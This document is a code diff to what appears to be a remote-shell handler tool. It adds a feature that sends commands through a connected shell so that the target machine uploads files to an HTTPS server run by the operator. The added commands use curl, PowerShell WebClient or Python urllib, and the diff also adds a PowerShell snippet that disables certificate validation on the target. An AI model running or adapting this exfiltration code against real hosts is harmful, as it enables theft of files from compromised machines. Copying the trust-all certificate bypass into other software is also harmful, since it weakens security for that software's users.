@@ -108,6 +108,17 @@ class FileTransfer:
 
         return remote_path
 
+    def _resolve_local_target(self, local_path, remote_path):
+        basename = os.path.basename(remote_path.replace('\\', '/').rstrip('/'))
+        if not basename:
+            return local_path
+        if (local_path.endswith('/') or local_path.endswith('\\')
+                or local_path.endswith(os.sep)):
+            return os.path.join(local_path.rstrip('/\\'), basename)
+        if os.path.isdir(local_path):
+            return os.path.join(local_path, basename)
+        return local_path
+
     def _resolve_bind_ip(self, spec):
         if not spec:
             return '0.0.0.0'
@@ -171,6 +182,7 @@ class FileTransfer:
             print(f"{self.h.colors['red']}Failed to build TLS context: "
                   f"{e}{self.h.colors['end']}")
             return None
+            
     def _upload_via_https(self, client_sock, local_path, remote_path,
                           https_bind=None, rh_host=None, rh_port=None):
         info = self.h._client_info(client_sock)
@@ -390,6 +402,250 @@ class FileTransfer:
         print(f"  Local:  {local_hash}")
         print(f"  Remote: {remote_hash or 'unavailable'}")
         self._log_transfer(client_sock, 'upload', local_path, remote_path,
+                           'hash_mismatch')
+        return False
+
+    def _download_via_https_push(self, client_sock, remote_path, local_path,
+                                 https_bind=None, rh_host=None, rh_port=None):
+        info = self.h._client_info(client_sock)
+        if not info:
+            print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
+            return False
+        shell_type = info.get('type', 'unknown')
+
+        remote_size = self.h._remote_file_size(client_sock, remote_path, shell_type)
+        if remote_size is None:
+            print(f"{self.h.colors['red']}Remote file not found or unreadable: "
+                  f"{remote_path}{self.h.colors['end']}")
+            return False
+
+        print(f"{self.h.colors['yellow']}Computing remote SHA256..."
+              f"{self.h.colors['end']}", end='', flush=True)
+        remote_hash = self.h._remote_sha256(client_sock, remote_path, shell_type)
+        if not remote_hash:
+            print(f"\r{self.h.colors['red']}Could not compute remote hash — aborting"
+                  f"{self.h.colors['end']}")
+            return False
+        print(f"\r{self.h.colors['blue']}Remote SHA256: {remote_hash}"
+              f"{self.h.colors['end']}          ")
+
+        bind_ip = self._resolve_bind_ip(https_bind)
+        if bind_ip is None:
+            print(f"{self.h.colors['red']}Could not resolve interface "
+                  f"'{https_bind}' to an IP address.{self.h.colors['end']}")
+            return False
+
+        local_dir = os.path.dirname(os.path.abspath(local_path))
+        if local_dir:
+            os.makedirs(local_dir, exist_ok=True)
+
+        try:
+            port, thread, stop_event, server, state, dest_fh = \
+                self._start_upload_http_server(
+                    local_path, port=rh_port, path='/upload',
+                    bind_ip=bind_ip,
+                )
+        except OSError as e:
+            print(f"{self.h.colors['red']}HTTPS server start failed on "
+                  f"{bind_ip}:{rh_port or 'any'}: {e}{self.h.colors['end']}")
+            return False
+        except RuntimeError as e:
+            print(f"{self.h.colors['red']}{e}{self.h.colors['end']}")
+            return False
+
+        if rh_host:
+            advertise_ip = rh_host
+        elif bind_ip != '0.0.0.0':
+            advertise_ip = bind_ip
+        else:
+            try:
+                advertise_ip = client_sock.getsockname()[0]
+            except Exception:
+                advertise_ip = '127.0.0.1'
+
+        url = f"https://{advertise_ip}:{port}/upload"
+
+        c = self.h.colors
+        print(f"{c['yellow']}HTTPS upload endpoint started:{c['end']}")
+        print(f"  Bind:      {bind_ip}:{port}")
+        print(f"  Advertise: {advertise_ip}:{port}")
+        print(f"  URL:       {url}")
+        print(f"{c['yellow']}Downloading {remote_path} -> {local_path} "
+              f"({self._format_size(remote_size)}) via HTTPS push{c['end']}")
+        print(f"{c['blue']}Remote SHA256: {remote_hash}{c['end']}")
+
+        self.h._flush_shell(client_sock)
+        escaped = remote_path.replace("'", "''")
+
+        if shell_type == 'windows':
+            ps_cmd = (
+                f"$ErrorActionPreference='Stop'; "
+                f"$url='{url}'; $file='{escaped}'; "
+                f"$done=$false; $log=''; "
+                f"try {{ "
+                f"  Add-Type -TypeDefinition "
+                f"'using System;using System.Net;using System.Security.Cryptography.X509Certificates;"
+                f"public static class TornadoTrustPush {{ "
+                f"public static bool All(object s, X509Certificate c, X509Chain ch, "
+                f"System.Net.Security.SslPolicyErrors e) {{ return true; }} }}' "
+                f"-ErrorAction SilentlyContinue; "
+                f"  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = [TornadoTrustPush]::All; "
+                f"  [Net.ServicePointManager]::SecurityProtocol = "
+                f"[Net.SecurityProtocolType]::Tls12 -bor "
+                f"[Net.SecurityProtocolType]::Tls11 -bor "
+                f"[Net.SecurityProtocolType]::Tls "
+                f"}} catch {{ $log += ' [ADD-TYPE:' + $_.Exception.Message + ']' }}; "
+                f"if (-not $done) {{ try {{ "
+                f"  $curl = Get-Command curl.exe -EA SilentlyContinue; "
+                f"  if ($curl) {{ "
+                f"    & curl.exe -k --tlsv1.2 -fsSL -T $file $url; "
+                f"    if ($LASTEXITCODE -eq 0) {{ $done=$true }} "
+                f"    else {{ $log+=' [CURL:exit=' + $LASTEXITCODE + ']' }} "
+                f"  }} else {{ $log+=' [CURL:not-present]' }} "
+                f"}} catch {{ $log += ' [CURL:' + $_.Exception.Message + ']' }} }}; "
+                f"if (-not $done) {{ try {{ "
+                f"  $wc = New-Object System.Net.WebClient; "
+                f"  $wc.UploadFile($url, 'PUT', $file) | Out-Null; "
+                f"  $done=$true "
+                f"}} catch {{ "
+                f"  $log += ' [WC:' + $_.Exception.Message; "
+                f"  if ($_.Exception.InnerException) {{ $log += ' / ' + $_.Exception.InnerException.Message }}; "
+                f"  $log += ']' "
+                f"}} }}; "
+                f"if ($done) {{ Write-Output '{XFER_MARK_START}OK{XFER_MARK_END}' }} "
+                f"else {{ Write-Output ('{XFER_MARK_START}FAIL:' + $log + '{XFER_MARK_END}') }}"
+            )
+            client_sock.sendall((ps_cmd + '\n').encode('utf-8'))
+        else:
+            esc_url = url.replace("'", "'\\''")
+            esc_file = remote_path.replace("'", "'\\''")
+            cmd = (
+                f"("
+                f"curl -k --tlsv1.2 -fsSL -T '{esc_file}' '{esc_url}' && "
+                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
+                f") || ("
+                f"curl -k -fsSL -T '{esc_file}' '{esc_url}' && "
+                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
+                f") || ("
+                f"python3 -c \"import ssl,urllib.request;"
+                f"ctx=ssl._create_unverified_context();"
+                f"ctx.minimum_version=getattr(ssl,'TLSVersion',None)"
+                f" and ssl.TLSVersion.TLSv1_2 or ctx.minimum_version;"
+                f"data=open('{esc_file}','rb').read();"
+                f"req=urllib.request.Request('{esc_url}',data=data,method='PUT');"
+                f"urllib.request.urlopen(req,context=ctx)\" && "
+                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
+                f") || ("
+                f"python -c \"import ssl,urllib2;"
+                f"ctx=ssl._create_unverified_context();"
+                f"data=open('{esc_file}','rb').read();"
+                f"req=urllib2.Request('{esc_url}',data=data);"
+                f"req.get_method=lambda:'PUT';"
+                f"urllib2.urlopen(req,context=ctx)\" && "
+                f"echo '{XFER_MARK_START}OK{XFER_MARK_END}'"
+                f") || echo '{XFER_MARK_START}FAIL{XFER_MARK_END}'"
+            )
+            client_sock.sendall((cmd + '\n').encode('utf-8'))
+
+        start_time = time.time()
+        timeout = 1800.0
+        last_progress = 0.0
+        while time.time() - start_time < timeout:
+            if state['done'].is_set():
+                break
+            if remote_size > 0 and (time.time() - last_progress) > 0.5:
+                self._print_progress(state['received'], remote_size,
+                                     start_time, 'Download')
+                last_progress = time.time()
+            time.sleep(0.1)
+
+        upload_ok = state['done'].is_set()
+        if remote_size > 0:
+            self._print_progress(min(state['received'], remote_size),
+                                 remote_size, start_time, 'Download')
+            print()
+
+        output = b''
+        marker_start = XFER_MARK_START.encode()
+        marker_end = XFER_MARK_END.encode()
+        marker_deadline = time.time() + (15.0 if upload_ok else 2.0)
+
+        try:
+            client_sock.settimeout(1.0)
+            while time.time() < marker_deadline:
+                try:
+                    chunk = client_sock.recv(4096)
+                    if not chunk:
+                        break
+                    output += chunk
+                    if marker_start in output and marker_end in output:
+                        break
+                except socket.timeout:
+                    continue
+                except Exception:
+                    break
+        finally:
+            try:
+                client_sock.settimeout(None)
+            except Exception:
+                pass
+
+        stop_event.set()
+        try:
+            thread.join(timeout=2.0)
+        except Exception:
+            pass
+        try:
+            dest_fh.flush()
+            dest_fh.close()
+        except Exception:
+            pass
+
+        result = None
+        try:
+            si = output.find(marker_start) + len(marker_start)
+            ei = output.find(marker_end, si)
+            if si != -1 and ei != -1:
+                result = output[si:ei].decode('utf-8', errors='replace').strip()
+        except Exception:
+            pass
+
+        if state.get('error'):
+            print(f"{self.h.colors['red']}HTTPS push failed on server side: "
+                  f"{state['error']}{self.h.colors['end']}")
+            self._log_transfer(client_sock, 'download', local_path, remote_path,
+                               'failed', f"server:{state['error']}")
+            return False
+
+        if not upload_ok or state['received'] == 0:
+            detail = result or 'no data received'
+            print(f"{self.h.colors['red']}HTTPS push failed "
+                  f"(target error: {detail}){self.h.colors['end']}")
+            self._log_transfer(client_sock, 'download', local_path, remote_path,
+                               'failed', f'https_push:{detail}')
+            return False
+
+        if result != 'OK':
+            print(f"{self.h.colors['yellow']}Warning: target reported: {result}"
+                  f"{self.h.colors['end']}")
+
+        print(f"{self.h.colors['yellow']}Verifying local integrity..."
+              f"{self.h.colors['end']}", end='', flush=True)
+        local_hash = self.h._sha256_file(local_path)
+        if local_hash == remote_hash:
+            print(f"\r{self.h.colors['green']}Integrity verified — SHA256 match"
+                  f"{self.h.colors['end']}          ")
+            print(f"{self.h.colors['green']}Download complete: {local_path}"
+                  f"{self.h.colors['end']}")
+            self._log_transfer(client_sock, 'download', local_path, remote_path,
+                               'complete')
+            return True
+
+        print(f"\r{self.h.colors['red']}Integrity mismatch!"
+              f"{self.h.colors['end']}")
+        print(f"  Remote: {remote_hash}")
+        print(f"  Local:  {local_hash}")
+        self._log_transfer(client_sock, 'download', local_path, remote_path,
                            'hash_mismatch')
         return False
 
@@ -672,6 +928,149 @@ class FileTransfer:
                 pass
         return AgentHandler
 
+    def _make_upload_handler(self, dest_fh, lock, state, path='/upload'):
+        class UploadHandler(http.server.BaseHTTPRequestHandler):
+            protocol_version = 'HTTP/1.1'
+
+            def _handle_upload(self):
+                parsed = urllib.parse.urlparse(self.path)
+                if parsed.path != path:
+                    self.send_response(404)
+                    self.send_header('Content-Length', '0')
+                    self.end_headers()
+                    self.close_connection = True
+                    return
+
+                length_header = self.headers.get('Content-Length')
+                if not (length_header and length_header.isdigit()):
+                    self.send_response(411)  # Length Required
+                    self.send_header('Content-Length', '0')
+                    self.end_headers()
+                    self.close_connection = True
+                    return
+
+                remaining = int(length_header)
+                try:
+                    while remaining > 0:
+                        chunk = self.rfile.read(min(65536, remaining))
+                        if not chunk:
+                            break
+                        with lock:
+                            dest_fh.write(chunk)
+                            state['received'] += len(chunk)
+                        remaining -= len(chunk)
+                    with lock:
+                        dest_fh.flush()
+                    state['done'].set()
+                except Exception as e:
+                    state['error'] = str(e)
+                    state['done'].set()
+
+                try:
+                    self.send_response(200)
+                    self.send_header('Content-Type', 'text/plain')
+                    self.send_header('Content-Length', '2')
+                    self.end_headers()
+                    self.wfile.write(b'OK')
+                except Exception:
+                    pass
+                self.close_connection = True
+
+            do_PUT = _handle_upload
+            do_POST = _handle_upload
+
+            def log_message(self, *a):
+                pass
+
+        return UploadHandler
+
+    def _start_upload_http_server(self, dest_path, port=None, path='/upload',
+                                  bind_ip='0.0.0.0'):
+        tls_ctx = None
+        if hasattr(self.h, 'create_tls_context'):
+            try:
+                tls_ctx = self.h.create_tls_context()
+            except Exception:
+                tls_ctx = None
+
+        if tls_ctx is None:
+            certfile = getattr(self.h, 'certfile', None)
+            keyfile = getattr(self.h, 'keyfile', None)
+            if not certfile or not keyfile:
+                raise RuntimeError(
+                    "HTTPS upload server requires handler.certfile and "
+                    "handler.keyfile to be configured"
+                )
+            if not (os.path.isfile(certfile) and os.path.isfile(keyfile)):
+                raise RuntimeError(
+                    f"TLS material not found: certfile={certfile!r} "
+                    f"keyfile={keyfile!r}"
+                )
+            try:
+                tls_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                tls_ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
+                tls_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+                tls_ctx.options |= ssl.OP_NO_COMPRESSION
+            except (ssl.SSLError, OSError) as e:
+                raise RuntimeError(f"Failed to build TLS context: {e}")
+
+        dest_fh = open(dest_path, 'wb')
+        try:
+            lock = threading.Lock()
+            state = {'received': 0, 'done': threading.Event(), 'error': None}
+            handler_cls = self._make_upload_handler(dest_fh, lock, state, path=path)
+
+            class _TLSServer(socketserver.TCPServer):
+                allow_reuse_address = True
+
+                def __init__(self, addr, handler):
+                    self._tls_ctx = tls_ctx
+                    super().__init__(addr, handler)
+
+                def get_request(self):
+                    sock, addr = super().get_request()
+                    try:
+                        sock = self._tls_ctx.wrap_socket(sock, server_side=True)
+                    except (ssl.SSLError, OSError):
+                        try:
+                            sock.close()
+                        except OSError:
+                            pass
+                        raise
+                    return sock, addr
+
+                def handle_error(self, request, client_address):
+                    pass
+
+            if port is None:
+                server = _TLSServer((bind_ip, 0), handler_cls)
+                port = server.server_address[1]
+            else:
+                server = _TLSServer((bind_ip, port), handler_cls)
+
+            stop_event = threading.Event()
+
+            def serve():
+                while not stop_event.is_set():
+                    try:
+                        server.handle_request()
+                    except OSError:
+                        break
+                try:
+                    server.server_close()
+                except Exception:
+                    pass
+
+            thread = threading.Thread(target=serve, daemon=True)
+            thread.start()
+            return port, thread, stop_event, server, state, dest_fh
+        except Exception:
+            try:
+                dest_fh.close()
+            except Exception:
+                pass
+            raise
+
     def upload_file(self, client_sock, local_path, remote_path, resume=False,
                     use_https=False, https_bind=None, rh_host=None, rh_port=None):
         info = self.h._client_info(client_sock)
@@ -902,11 +1301,31 @@ class FileTransfer:
         self._log_transfer(client_sock, 'upload', local_path, remote_path, 'hash_mismatch')
         return False
 
-    def download_file(self, client_sock, remote_path, local_path, resume=False):
+    def download_file(self, client_sock, remote_path, local_path, resume=False,
+                      use_https_push=False, https_bind=None, rh_host=None,
+                      rh_port=None):
         info = self.h._client_info(client_sock)
         if not info:
             print(f"{self.h.colors['red']}Client disconnected{self.h.colors['end']}")
             return False
+
+        original_local = local_path
+        local_path = self._resolve_local_target(local_path, remote_path)
+        if local_path != original_local:
+            print(
+                f"{self.h.colors['blue']}Local path resolved: "
+                f"{original_local} -> {local_path}{self.h.colors['end']}"
+            )
+
+        if use_https_push:
+            if resume:
+                print(f"{self.h.colors['yellow']}Resume is not supported for "
+                      f"HTTPS push — performing full download"
+                      f"{self.h.colors['end']}")
+            return self._download_via_https_push(
+                client_sock, remote_path, local_path,
+                https_bind=https_bind, rh_host=rh_host, rh_port=rh_port,
+            )
         shell_type = info.get('type', 'unknown')
         remote_size = self.h._remote_file_size(client_sock, remote_path, shell_type)
         if remote_size is None:
